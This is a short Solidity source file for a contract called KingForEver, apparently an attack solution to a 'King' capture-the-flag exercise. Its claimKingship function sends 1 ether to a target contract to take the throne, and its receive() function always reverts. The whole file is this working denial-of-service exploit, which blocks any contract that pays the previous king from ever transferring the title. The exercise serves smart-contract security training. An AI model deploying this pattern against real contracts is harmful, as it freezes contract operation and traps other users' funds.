// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingForEver {

    function claimKingship(address payable target) payable public {
        target.call.value(1 ether).gas(8000000)("");
    }

    receive() external payable {
        revert();
    }
}
